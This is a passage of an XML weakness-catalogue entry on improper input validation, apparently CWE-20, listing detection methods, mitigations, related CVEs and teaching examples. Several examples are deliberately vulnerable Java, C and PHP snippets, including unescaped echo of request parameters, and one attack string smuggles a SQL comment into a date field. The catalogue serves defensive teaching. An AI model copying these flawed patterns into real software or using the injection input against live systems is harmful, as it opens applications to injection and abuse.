               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Host Application Interface Scanner</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Attack Modeling</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>Consider using language-theoretic security (LangSec) techniques that characterize inputs using a formal language and build "recognizers" for that language.  This effectively requires parsing to be a distinct layer that effectively enforces a boundary between raw input and internal data representations, instead of allowing parser code to be scattered throughout the program, where it could be subject to errors or inconsistencies that create weaknesses. [REF-1109] [REF-1110] [REF-1111]</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-7">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use an input validation framework such as Struts or the OWASP ESAPI Validation API. Note that using a framework does not automatically address all input validation problems; be mindful of weaknesses that could arise from misusing the framework itself (CWE-1173).</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
	       <Effectiveness>High</Effectiveness>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</xhtml:p>
                  <xhtml:p>Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When your application combines data from multiple sources, perform the validation after the sources have been combined. The individual data elements may pass the validation step but violate the intended restrictions after they have been combined.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-35">
               <Phase>Implementation</Phase>
               <Description>Be especially careful to validate all input when invoking code that crosses language boundaries, such as from an interpreted language to native code. This could create an unexpected interaction between the language boundaries. Ensure that you are not violating any of the expectations of the language with which you are interfacing. For example, even though Java may not be susceptible to buffer overflows, providing a large argument in a call to native code might trigger an overflow.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Directly convert your input type into the expected data type, such as using a conversion function that translates a string into a number. After converting to the expected data type, ensure that the input's values fall within the expected range of allowable values and that multi-field consistencies are maintained.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass allowlist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.</xhtml:p>
                  <xhtml:p>Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-135">
               <Intro_Text>This example demonstrates a shopping interaction in which the user is free to specify the quantity of items to be purchased and a total is calculated.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>public static final double price = 20.00;<xhtml:br/>int quantity = currentUser.getAttribute("quantity");<xhtml:br/>double total = price * quantity;<xhtml:br/>chargeUser(total);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The user has no control over the price variable, however the code does not prevent a negative value from being specified for quantity. If an attacker were to provide a negative value, then the user would have their account credited instead of debited.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-136">
               <Intro_Text>This example asks the user for a height and width of an m X n game board with a maximum dimension of 100 squares.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>...<xhtml:br/>#define MAX_DIM 100<xhtml:br/>...<xhtml:br/>
                     <xhtml:i>/* board dimensions */</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>int m,n, error;<xhtml:br/>board_square_t *board;<xhtml:br/>printf("Please specify the board height: \n");<xhtml:br/>error = scanf("%d", &amp;m);<xhtml:br/>if ( EOF == error ){<xhtml:div style="margin-left:1em;">die("No integer passed: Die evil hacker!\n");</xhtml:div>}<xhtml:br/>printf("Please specify the board width: \n");<xhtml:br/>error = scanf("%d", &amp;n);<xhtml:br/>if ( EOF == error ){<xhtml:div style="margin-left:1em;">die("No integer passed: Die evil hacker!\n");</xhtml:div>}<xhtml:br/>if ( m &gt; MAX_DIM || n &gt; MAX_DIM ) {<xhtml:div style="margin-left:1em;">die("Value too large: Die evil hacker!\n");</xhtml:div>}<xhtml:br/>board = (board_square_t*) malloc( m * n * sizeof(board_square_t));<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>While this code checks to make sure the user cannot specify large, positive integers and consume too much memory, it does not check for negative values supplied by the user. As a result, an attacker can perform a resource consumption (CWE-400) attack against this program by specifying two, large negative values that will not overflow, resulting in a very large memory allocation (CWE-789) and possibly a system crash. Alternatively, an attacker can provide very large negative values which will cause an integer overflow (CWE-190) and unexpected behavior will follow depending on how the values are treated in the remainder of the program.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following example shows a PHP application in which the programmer attempts to display a user's birthday and homepage.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$birthday = $_GET['birthday'];<xhtml:br/>$homepage = $_GET['homepage'];<xhtml:br/>echo "Birthday: $birthday&lt;br&gt;Homepage: &lt;a href=$homepage&gt;click here&lt;/a&gt;"</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer intended for $birthday to be in a date format and $homepage to be a valid URL. However, since the values are derived from an HTTP request, if an attacker can trick a victim into clicking a crafted URL with &lt;script&gt; tags providing the values for birthday and / or homepage, then the script will run on the client's browser when the web server echoes the content. Notice that even if the programmer were to defend the $birthday variable by restricting input to integers and dashes, it would still be possible for an attacker to provide a string of the form:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>2009-01-09--</xhtml:div>
               </Example_Code>
               <Body_Text>If this data were used in a SQL statement, it would treat the remainder of the statement as a comment. The comment could disable other security-related logic in the statement. In this case, encoding combined with input validation would be a more useful protection mechanism.</Body_Text>
               <Body_Text>Furthermore, an XSS (CWE-79) attack or SQL injection (CWE-89) are just a few of the potential consequences when input validation is not used. Depending on the context of the code, CRLF Injection (CWE-93), Argument Injection (CWE-88), or Command Injection (CWE-77) may also be possible.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-34">
               <Intro_Text>The following example takes a user-supplied value to allocate an array of objects and then operates on the array.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>private void buildList ( int untrustedListSize ){<xhtml:div style="margin-left:1em;">if ( 0 &gt; untrustedListSize ){<xhtml:div style="margin-left:1em;">die("Negative value supplied for list size, die evil hacker!");</xhtml:div>}<xhtml:br/>Widget[] list = new Widget [ untrustedListSize ];<xhtml:br/>list[0] = new Widget();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This example attempts to build a list from a user-specified value, and even checks to ensure a non-negative value is supplied. If, however, a 0 value is provided, the code will build an array of size 0 and then try to store a new Widget in the first location, causing an exception to be thrown.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-110">
               <Intro_Text>This Android application has registered to handle a URL when sent an intent:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i>...</xhtml:i>
                     <xhtml:br/>IntentFilter filter = new IntentFilter("com.example.URLHandler.openURL");<xhtml:br/>MyReceiver receiver = new MyReceiver();<xhtml:br/>registerReceiver(receiver, filter);<xhtml:br/>
                     <xhtml:i>...</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>public class UrlHandlerReceiver extends BroadcastReceiver {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>@Override<xhtml:br/>public void onReceive(Context context, Intent intent) {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>if("com.example.URLHandler.openURL".equals(intent.getAction())) {<xhtml:div style="margin-left:1em;">String URL = intent.getStringExtra("URLToOpen");<xhtml:br/>int length = URL.length();</xhtml:div>
                                 <xhtml:br/>
                                 <xhtml:i>...</xhtml:i>
                                 <xhtml:br/>}</xhtml:div>
                           </xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2021-30860</Reference>
               <Description>Chain: improper input validation (CWE-20) leads to integer overflow (CWE-190) in mobile OS, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-30860</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-30663</Reference>
               <Description>Chain: improper input validation (CWE-20) leads to integer overflow (CWE-190) in mobile OS, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-30663</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-22205</Reference>
               <Description>Chain: backslash followed by a newline can bypass a validation step (CWE-20), leading to eval injection (CWE-95), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-22205</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-21220</Reference>
               <Description>Chain: insufficient input validation (CWE-20) in browser allows heap corruption (CWE-787), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-21220</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-9054</Reference>
               <Description>Chain: improper input validation (CWE-20) in username parameter, leading to OS command injection (CWE-78), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-9054</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-3452</Reference>
               <Description>Chain: security product has improper input validation (CWE-20) leading to directory traversal (CWE-22), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-3452</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-3161</Reference>
               <Description>Improper input validation of HTTP requests in IP phone, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-3161</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-3580</Reference>
               <Description>Chain: improper input validation (CWE-20) in firewall product leads to XSS (CWE-79), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-3580</Link>
            </Observed_Example>
            <Observed_Example>
            <Reference>CVE-2021-37147</Reference>
            <Description>Chain: caching proxy server has improper input validation (CWE-20) of headers, allowing HTTP response smuggling (CWE-444) using an "LF line ending"</Description>
            <Link>https://www.cve.org/CVERecord?id=CVE-2021-37147</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5305</Reference>
               <Description>Eval injection in Perl program using an ID that should only contain hyphens and numbers.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5305</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2223</Reference>
               <Description>SQL injection through an ID that was supposed to be numeric.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2223</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3477</Reference>
               <Description>lack of input validation in spreadsheet program leads to buffer overflows, integer overflows, array index errors, and memory corruption.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3477</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3843</Reference>
               <Description>insufficient validation enables XSS</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3843</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3174</Reference>
               <Description>driver in security product allows code execution due to insufficient validation</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3174</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-3409</Reference>
               <Description>infinite loop from DNS packet with a label that points to itself</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-3409</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6870</Reference>
               <Description>infinite loop from DNS packet with a label that points to itself</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-6870</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1303</Reference>
               <Description>missing parameter leads to crash</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1303</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5893</Reference>
               <Description>HTTP request with missing protocol version number leads to crash</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5893</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6658</Reference>
               <Description>request with missing parameters leads to information exposure</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-6658</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4114</Reference>
               <Description>system crash with offset value that is inconsistent with packet size</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4114</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-3790</Reference>
               <Description>size field that is inconsistent with packet size leads to buffer over-read</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-3790</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2309</Reference>
               <Description>product uses a denylist to identify potentially dangerous content, allowing attacker to bypass a warning</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2309</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3494</Reference>
               <Description>security bypass via an extra header</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3494</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3571</Reference>
               <Description>empty packet triggers reboot</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3571</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-5525</Reference>
               <Description>incomplete denylist allows SQL injection</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-5525</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1284</Reference>
               <Description>NUL byte in theme name causes directory traversal impact to be worse</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1284</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0600</Reference>
               <Description>kernel does not validate an incoming pointer before dereferencing it</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0600</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1738</Reference>
               <Description>anti-virus product has insufficient input validation of hooked SSDT functions, allowing code execution</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1738</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1737</Reference>
               <Description>anti-virus product allows DoS via zero-length field</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1737</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3464</Reference>
               <Description>driver does not validate input from userland to the kernel</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3464</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2252</Reference>
               <Description>kernel does not validate parameters sent in from userland, allowing code execution</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2252</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2374</Reference>
               <Description>lack of validation of string length fields allows memory consumption or buffer over-read</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2374</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1440</Reference>
               <Description>lack of validation of length field leads to infinite loop</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1440</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1625</Reference>
               <Description>lack of validation of input to an IOCTL allows code execution</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1625</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3177</Reference>
               <Description>zero-length attachment causes crash</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3177</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-2442</Reference>
               <Description>zero-length input causes free of uninitialized pointer</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-2442</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5563</Reference>
               <Description>crash via a malformed frame structure</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5563</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5285</Reference>
               <Description>infinite loop from a long SMTP request</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5285</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3812</Reference>
               <Description>router crashes with a malformed packet</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3812</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3680</Reference>
               <Description>packet with invalid version number leads to NULL pointer dereference</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3680</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3660</Reference>
               <Description>crash via multiple "." characters in file extension</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3660</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Input validation and representation</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Unvalidated Input</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ERR07-C</Entry_ID>
               <Entry_Name>Prefer functions that support error checking over equivalent functions that don't</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>FIO30-C</Entry_ID>
               <Entry_Name>Exclude user input from format strings</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MEM10-C</Entry_ID>
               <Entry_Name>Define and use a pointer validation function</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>20</Entry_ID>
               <Entry_Name>Improper Input Handling</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP25</Entry_ID>
               <Entry_Name>Tainted input to variable</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="10"/>
            <Related_Attack_Pattern CAPEC_ID="101"/>
            <Related_Attack_Pattern CAPEC_ID="104"/>
            <Related_Attack_Pattern CAPEC_ID="108"/>
            <Related_Attack_Pattern CAPEC_ID="109"/>
            <Related_Attack_Pattern CAPEC_ID="110"/>
            <Related_Attack_Pattern CAPEC_ID="120"/>
            <Related_Attack_Pattern CAPEC_ID="13"/>
            <Related_Attack_Pattern CAPEC_ID="135"/>
            <Related_Attack_Pattern CAPEC_ID="136"/>
            <Related_Attack_Pattern CAPEC_ID="14"/>
            <Related_Attack_Pattern CAPEC_ID="153"/>
            <Related_Attack_Pattern CAPEC_ID="182"/>
            <Related_Attack_Pattern CAPEC_ID="209"/>
            <Related_Attack_Pattern CAPEC_ID="22"/>
            <Related_Attack_Pattern CAPEC_ID="23"/>
            <Related_Attack_Pattern CAPEC_ID="230"/>
            <Related_Attack_Pattern CAPEC_ID="231"/>
            <Related_Attack_Pattern CAPEC_ID="24"/>
            <Related_Attack_Pattern CAPEC_ID="250"/>
            <Related_Attack_Pattern CAPEC_ID="261"/>
            <Related_Attack_Pattern CAPEC_ID="267"/>
            <Related_Attack_Pattern CAPEC_ID="28"/>
            <Related_Attack_Pattern CAPEC_ID="3"/>
            <Related_Attack_Pattern CAPEC_ID="31"/>
            <Related_Attack_Pattern CAPEC_ID="42"/>
            <Related_Attack_Pattern CAPEC_ID="43"/>
            <Related_Attack_Pattern CAPEC_ID="45"/>
            <Related_Attack_Pattern CAPEC_ID="46"/>
            <Related_Attack_Pattern CAPEC_ID="47"/>
            <Related_Attack_Pattern CAPEC_ID="473"/>
            <Related_Attack_Pattern CAPEC_ID="52"/>
            <Related_Attack_Pattern CAPEC_ID="53"/>
            <Related_Attack_Pattern CAPEC_ID="588"/>
            <Related_Attack_Pattern CAPEC_ID="63"/>
            <Related_Attack_Pattern CAPEC_ID="64"/>
            <Related_Attack_Pattern CAPEC_ID="664"/>
            <Related_Attack_Pattern CAPEC_ID="67"/>
            <Related_Attack_Pattern CAPEC_ID="7"/>
            <Related_Attack_Pattern CAPEC_ID="71"/>
            <Related_Attack_Pattern CAPEC_ID="72"/>
            <Related_Attack_Pattern CAPEC_ID="73"/>
            <Related_Attack_Pattern CAPEC_ID="78"/>
            <Related_Attack_Pattern CAPEC_ID="79"/>
            <Related_Attack_Pattern CAPEC_ID="8"/>
            <Related_Attack_Pattern CAPEC_ID="80"/>
            <Related_Attack_Pattern CAPEC_ID="81"/>
            <Related_Attack_Pattern CAPEC_ID="83"/>
            <Related_Attack_Pattern CAPEC_ID="85"/>
            <Related_Attack_Pattern CAPEC_ID="88"/>
            <Related_Attack_Pattern CAPEC_ID="9"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
            <Reference External_Reference_ID="REF-166"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-168" Section="Input Validation Attacks"/>
            <Reference External_Reference_ID="REF-48"/>
            <Reference External_Reference_ID="REF-170"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 10, &#34;All Input Is Evil!&#34; Page 341"/>
            <Reference External_Reference_ID="REF-1109"/>
            <Reference External_Reference_ID="REF-1110"/>
            <Reference External_Reference_ID="REF-1111"/>
            <Reference External_Reference_ID="REF-1287" Section="Details of Problematic Mappings"/>
         </References>
         <Notes>
            <Note Type="Mapping">
               <xhtml:p>Use for Mapping: Discouraged (this CWE ID should not be used to map to real-world vulnerabilities).</xhtml:p>
               <xhtml:p>Rationale: CWE-20 is commonly misused in low-information vulnerability reports when lower-level CWEs could be used instead, or when more details about the vulnerability are available [REF-1287]. It is not useful for trend analysis. It is also a level-1 Class (i.e., a child of a Pillar).</xhtml:p>
               <xhtml:p>Comments: consider lower-level children such
               as Improper Use of Validation Framework (CWE-1173) or
               improper validation involving specific types or
               properties of input such as Specified Quantity
               (CWE-1284); Specified Index, Position, or Offset
               (CWE-1285)); Syntactic Correctness (CWE-1286);
               Specified Type (CWE-1287); Consistency within Input
               (CWE-1288); or Unsafe Equivalence (CWE-1289).</xhtml:p>
            </Note>
            <Note Type="Relationship">
               <xhtml:p>CWE-116 and CWE-20 have a close association because, depending on the nature of the structured message, proper input validation can indirectly prevent special characters from changing the meaning of a structured message. For example, by validating that a numeric ID field should only contain the 0-9 characters, the programmer effectively prevents injection attacks.</xhtml:p>
            </Note>
            <Note Type="Maintenance">As of 2020, this entry is used more often than preferred, and it is a source of frequent confusion. It is being actively modified for CWE 4.1 and subsequent versions.</Note>
            <Note Type="Maintenance">Concepts such as validation, data transformation, and neutralization are being refined, so relationships between CWE-20 and other entries such as CWE-707 may change in future versions, along with an update to the Vulnerability Theory document.</Note>
            <Note Type="Maintenance">Input validation - whether missing or incorrect - is such an essential and widespread part of secure development that it is implicit in many different weaknesses. Traditionally, problems such as buffer overflows and XSS have been classified as input validation problems by many security professionals. However, input validation is not necessarily the only protection mechanism available for avoiding such problems, and in some cases it is not even sufficient. The CWE team has begun capturing these subtleties in chains within the Research Concepts view (CWE-1000), but more work is needed.</Note>
            <Note Type="Terminology">
               <xhtml:p>The "input validation" term is extremely common, but it is used in many different ways. In some cases its usage can obscure the real underlying weakness or otherwise hide chaining and composite relationships.</xhtml:p>
